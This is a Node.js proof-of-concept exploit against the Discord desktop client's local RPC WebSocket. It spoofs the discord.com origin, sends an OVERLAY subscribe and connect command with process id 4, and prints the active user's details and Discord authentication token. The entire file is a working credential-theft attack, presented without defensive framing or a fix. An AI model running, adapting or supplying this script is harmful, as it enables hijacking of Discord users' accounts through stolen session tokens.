const ws = require("ws");
const uuid = require("uuid").v4;

// doesn't always run on this port
// the port range seems to always
// be around 64xx so figure it out
// yourself, this is a poc.
const gateway = "ws://127.0.0.1:6463/?v=1&encoding=json";

const con = new ws(gateway, {
    perMessageDeflate: true,
    headers: {
        origin: "https://discord.com",
    }
});

console.log("[>] connecting");

con.on("open", () => {
    console.log("[+] connected");
});

con.on("close", () => {
    console.log("[!] connection closed");
});

con.on('message', (data) => {
    data = JSON.parse(data);

    if (data.evt === "READY") {
        console.log("[+] ready message received");
        let message = {
            cmd: "SUBSCRIBE",
            args: {},
            evt: "OVERLAY",
            nonce: uuid()
        }

        con.send(JSON.stringify(message), () => {
            console.log("[+] subscribe message sent");
        });

        message = {
            cmd: "OVERLAY",
            args: {
                type: "CONNECT",
                pid: 4 /* system process LOL*/
            },
            nonce: uuid(),
        };

        con.send(JSON.stringify(message), () => {
            console.log("[+] connect message sent");
        });
    }

    if (data.cmd === "DISPATCH" && data.data.type === "DISPATCH" && data.data.pid === 4) {
        let payload_data = data.data.payloads[0];
        let active_user = payload_data.users[0];
        let token = payload_data.token;

        console.log(active_user);
        console.log(token);

        con.close();
    }
});